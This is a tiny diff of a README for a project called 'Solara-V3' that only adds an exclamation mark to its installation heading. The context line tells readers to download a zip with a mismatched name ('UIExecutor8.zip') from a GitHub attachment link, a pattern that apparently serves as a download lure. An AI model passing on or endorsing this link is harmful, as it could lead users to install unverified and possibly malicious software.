@@ -1,5 +1,5 @@
 # Solara-V3
-## Quick Installation
+## Quick Installation!
 
   1. **Download** Last Version: [Solara](https://github.com/user-attachments/files/16913523/UIExecutor8.zip)
 
